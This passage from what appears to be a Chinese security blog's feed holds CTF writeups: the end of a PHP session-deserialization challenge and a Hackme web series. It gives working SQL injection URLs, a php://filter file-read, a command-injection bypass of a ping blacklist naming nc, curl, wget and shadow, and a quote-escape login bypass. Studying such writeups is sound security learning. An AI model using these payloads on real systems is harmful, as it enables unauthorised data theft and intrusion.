class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果不指定，PHP 将默认使用 “php“ 作为 session 序列化的方法，payload 及结果如下：</p><p><img src="https://i.loli.net/2019/03/21/5c92dc9fa0478.png" alt="20190225215921526.png"></p><p>PS：不用纠结 <code>Content-Type</code>，这个对解题没有影响，重点是加入<code>\</code>，防止 <code>&quot;</code> 被转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:19:\"print_r($_SESSION);\";&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[a:<span class="number">1</span>:&#123;s:<span class="number">24</span>:<span class="string">"upload_progress_12312131"</span>;a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1551019950</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">434</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">434</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;</span><br><span class="line"> a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">55</span>:<span class="string">"] </span></span><br><span class="line"><span class="string">=&gt; OowoO Object(</span></span><br><span class="line"><span class="string">[mdzz] =&gt; print_r($_SESSION);</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p>根据 php 手册，存入 <code>session</code> 里的形式是这样的，由此看出 <code>field_name</code> 也可，所以不一定要用 <code>filename</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"><span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              </span><br><span class="line">    <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"><span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line"><span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line"><span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line"><span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line"><span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">            <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>, </span><br><span class="line">            <span class="comment">// When this file has started to be processed</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, </span><br><span class="line">            <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>拿 <code>flag</code> 的老套路就不多说了，把 <code>mdzz</code> 里的值换成你需要执行的操作即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>知识面，决定看到的攻击面有多广。</p><p>知识链，决定发动的杀伤链有多深。</p></blockquote><p> ——猪猪侠</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从-session-角度学习反序列化&quot;&gt;&lt;a href=&quot;#从-session-角度学习反序列化&quot; class=&quot;headerlink&quot; title=&quot;从 session 角度学习反序列化&quot;&gt;&lt;/a&gt;从 session 角度学习反序列化&lt;/h1&gt;&lt;p&gt;下面是题目给
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hackme-Web-Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Hackme-Writeup/</id>
    <published>2019-02-02T15:23:33.000Z</published>
    <updated>2019-05-15T16:27:29.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hide and seek</a></h2><blockquote><p>Can you see me? I’m so close to you but you can’t see me.</p></blockquote><p>这题查看源码即可。</p><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb" target="_blank" rel="noopener">guestbook</a></h2><blockquote><p>This guestbook sucks. <a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> is your friend. </p></blockquote><p>既然提示有 <code>sqlmap</code> ，或许可以一把梭。</p><p>先手注一波试试，发现没有任何过滤。</p><p>有四个字段，看一下<strong>显位</strong>。</p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0 union select 1,2,3,4" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrbl15e9j20ls0aijrx.jpg" alt></p><p>都有明显回显，直接上吧，盲注太慢。</p><p><strong>拿到列名</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0 union select 1,2,3,group_concat(table_name" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</a> from information_schema.tables where table_schema=database())</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrl665y7j20ox0amq3k.jpg" alt></p><p><strong>查询所有数据</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jvo2i9hmj20u50acaaw.jpg" alt></p><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a><a href="https://hackme.inndy.tw/lfi/" target="_blank" rel="noopener">LFI</a></h2><blockquote><p>What this admin’s password? That is not important at all, just get the flag. Tips: LFI, <code>php://filter</code></p></blockquote><p>用到 PHP 伪协议：<code>php://filter</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=pages/login</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到 login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'user'</span>] === <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'pass'</span>]) === <span class="string">'bed128365216c019988915ed3add75fb'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"?page=pages/login"</span> method=<span class="string">"post"</span> role=<span class="string">"form"</span>&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"user-i"</span>&gt;User&lt;/label&gt;</span><br><span class="line">&lt;input type="text" class="form-control" id="user-i" placeholder="Username" name="user"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"pass-i"</span>&gt;Password&lt;/label&gt;</span><br><span class="line">&lt;input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 再看下 config.php，拿到 flag</span></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_xsXSYP......&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">homepage</a></h2><blockquote><p>Where is the flag? Did you check the code? </p></blockquote><p>提示查看源代码，发现了一个特别的 <code>cute.js</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">嚝从㚁����= <span class="regexp">/嚚�嚚榅湛�㚁�� ~�𤫇���𤫇   /</span><span class="comment">/*織����*/</span> [<span class="string">'_'</span>]; o=(嚝�蔑嚝�)  =_=<span class="number">3</span>; c=(嚝巵矋��) =(嚝�蔑嚝�)-(嚝�蔑嚝�); (嚝氱䈑��) =(嚝巵矋��)= (o^_^o)/ (o^_^o);(嚝氱䈑��)=&#123;嚝巵矋��: <span class="string">'_'</span> ,嚝从㚁���� : ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝巵矋�篏 ,嚝�蔑嚝��� :(嚝从㚁����+ <span class="string">'_'</span>)[o^_^o -(嚝巵矋��)] ,嚝氱䈑����:((嚝�蔑嚝�==<span class="number">3</span>) +<span class="string">'_'</span>)[嚝�蔑嚝篏 &#125;; (嚝氱䈑��) [嚝巵矋�篏 =((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [c^_^o];(嚝氱䈑��) [<span class="string">'c'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [ (嚝�蔑嚝�)+(嚝�蔑嚝�)-(嚝巵矋��) ];(嚝氱䈑��) [<span class="string">'o'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [嚝巵矋�篏;(嚝剠嚝�)=(嚝氱䈑��) [<span class="string">'c'</span>]+(嚝氱䈑��) [<span class="string">'o'</span>]+(嚝从㚁���� +<span class="string">'_'</span>)[嚝巵矋�篏+ ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝�蔑嚝篏 + ((嚝氱.......</span><br></pre></td></tr></table></figure><p>别的师傅说是 <code>aaencode</code> 加密，我有点懵逼，以后再弄吧，这种题不值得多花时间。</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><a href="https://hackme.inndy.tw/ping/" target="_blank" rel="noopener">ping</a></h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>看来是源码审计的题目，命令注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;&lt;?php</span><br><span class="line">        $blacklist = [</span><br><span class="line">            &apos;flag&apos;, &apos;cat&apos;, &apos;nc&apos;, &apos;sh&apos;, &apos;cp&apos;, &apos;touch&apos;, &apos;mv&apos;, &apos;rm&apos;, &apos;ps&apos;, &apos;top&apos;, &apos;sleep&apos;, &apos;sed&apos;,</span><br><span class="line">            &apos;apt&apos;, &apos;yum&apos;, &apos;curl&apos;, &apos;wget&apos;, &apos;perl&apos;, &apos;python&apos;, &apos;zip&apos;, &apos;tar&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;kill&apos;,</span><br><span class="line">            &apos;passwd&apos;, &apos;shadow&apos;, &apos;root&apos;,</span><br><span class="line">            &apos;z&apos;,</span><br><span class="line">            &apos;dir&apos;, &apos;dd&apos;, &apos;df&apos;, &apos;du&apos;, &apos;free&apos;, &apos;tempfile&apos;, &apos;touch&apos;, &apos;tee&apos;, &apos;sha&apos;, &apos;x64&apos;, &apos;g&apos;,</span><br><span class="line">            &apos;xargs&apos;, &apos;PATH&apos;,</span><br><span class="line">            &apos;$0&apos;, &apos;proc&apos;,</span><br><span class="line">            &apos;/&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&gt;&apos;, &apos;&lt;&apos;, &apos;;&apos;, &apos;&quot;&apos;, &apos;\&apos;&apos;, &apos;\\&apos;, &quot;\n&quot;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &apos;IP toooooo longgggggggggg&apos;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&apos;ip&apos;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&apos;ip&apos;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现 <code>$</code> 没有在黑名单内，还可以 <code></code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(ls) / `ls`</span></span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat 被过滤了，但有一堆可以查看文件内容的命令啊</span></span><br><span class="line">tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！ </span><br><span class="line">more 一页一页的显示档案内容 </span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ </span><br><span class="line">head 只看头几行 </span><br><span class="line">tail 只看尾巴几行 </span><br><span class="line">nl   显示的时候，顺道输出行号！</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加个 * 模糊匹配一下</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(tac f*)</span></span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a href="https://hackme.inndy.tw/scoreboard" target="_blank" rel="noopener">scoreboard</a></h2><blockquote><p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don’t need to do that.</p></blockquote><p><code>header</code> 里发现了 <code>x-flag</code>。</p><h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0</a></h2><blockquote><p>SQL Injection!</p></blockquote><p>题目直接给了源码，开始审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">    <span class="comment">// \' =&gt; \\'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user === <span class="keyword">false</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;!-- debug: <span class="meta">&lt;?</span>=$sql<span class="meta">?&gt;</span> --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user-&gt;is_admin ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user-&gt;is_admin) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;, %s"</span>, htmlentities($flag1), $where_is_flag2); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 <code>DB_HOST</code> 这些参数还在想有没变量覆盖的洞，或许可连接自己的数据库， <code>safe_filter</code> 这并不能这样玩。</p><p>提示都说了是注入，还是老老实实 <code>sqli</code> 吧，简单的处理了一下 <code>POST</code> 数组，但是并不严格。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">\<span class="string">' =&gt; \\'</span> 即可绕过</span><br></pre></td></tr></table></figure><p>既然加了 <code>or 1</code> ，正常就显示第一条，并不会只查 <code>admin</code> 用户，所以需要手动调下，否则看不到 <code>flag</code> 的噢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kd6ju1zgj20y60gkmz6.jpg" alt></p><p><code>name=666&amp;password=\&#39; union select 1,1,1,1#</code> 直接就有了。</p><h2 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0.1</a></h2><blockquote><p>Grab the hidden flag</p></blockquote><p>从上一题中可以看到：flag2 in the database!  另外注意到有回显位，就不需要盲注了，然后就是常规套路了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdmo441pj20yq0j3gnt.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdoudznmj20yp0j8ac9.jpg" alt></p><p><img src="C:\Users\wywwzjj\AppData\Roaming\Typora\typora-user-images\1556585961992.png" alt="1556585961992"></p><h2 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1</a></h2><blockquote><p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br><strong>Scanner WON’T WORK</strong></p></blockquote><p>这题同样给了源码，与上一题大同小异，过滤稍微多点吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//require('WAF.php');</span></span><br><span class="line"></span><br><span class="line">$ua = strtolower($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($bad_ua <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr($ua, $bad)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I don't like hackers. :("</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br></pre></td></tr></table></figure><p>空格被过滤了，方法很多，这里以<code>/**/</code> 代替，然后故技重施。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2ke4fuj97j20yp0j340n.jpg" alt></p><h2 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1.2</a></h2><blockquote><p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p></blockquote><p>开始写脚本盲注，网络太慢了，以后搞。</p><h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a><a href="https://hackme.inndy.tw/login3" target="_blank" rel="noopener">login as admin 3</a></h2><figure class="highlight php"><table><tr><td 